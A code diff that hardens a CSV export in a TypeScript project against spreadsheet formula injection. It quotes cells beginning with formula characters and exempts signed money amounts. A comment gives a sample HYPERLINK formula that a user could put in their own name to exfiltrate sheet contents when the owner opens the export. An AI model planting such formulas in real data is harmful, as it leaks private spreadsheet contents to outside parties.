@@ -55,12 +55,27 @@ const CSV_HEADER = [
 ] as const;
 
 /** RFC-4180 field: double-quote, escape embedded ", flatten newlines to
- *  spaces — ported verbatim from the qbo-export precedent so a bookkeeper
- *  opens the same shape twice. */
+ *  spaces — ported from the qbo-export precedent so a bookkeeper opens the same
+ *  shape twice.
+ *
+ *  MS-04 — plus one thing RFC 4180 does not cover: a leading `=`, `+`, `-`, `@`
+ *  or tab makes Excel and Google Sheets read the cell as a FORMULA, and three of
+ *  this file's fourteen columns carry free text (Member, Project, Client).
+ *  `member_name` is `profiles.full_name`, which the studio member writes about
+ *  HERSELF — so the person being audited could name herself
+ *  `=HYPERLINK("https://…?d="&A1&B1,"Total")` and the owner's Friday export
+ *  would exfiltrate the sheet the moment it is opened, which is the stated point
+ *  of HT-20. A leading apostrophe is the standard neutralizer: both applications
+ *  treat the rest of the cell as literal text and hide the apostrophe itself. */
 function csvField(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return '""';
   const s = String(value).replace(/[\r\n]+/g, " ");
-  return `"${s.replace(/"/g, '""')}"`;
+  // A plain signed number is left alone — `-145.00` is a money cell a
+  // bookkeeper imports, not a formula; anything else leading with one of the
+  // five characters is quoted as text.
+  const guarded =
+    /^[=+\-@\t]/.test(s) && !/^[+-]?\d+(\.\d+)?$/.test(s) ? `'${s}` : s;
+  return `"${guarded.replace(/"/g, '""')}"`;
 }
 
 /** Integer cents → plain decimal dollars ("14500" → "145.00"), no currency
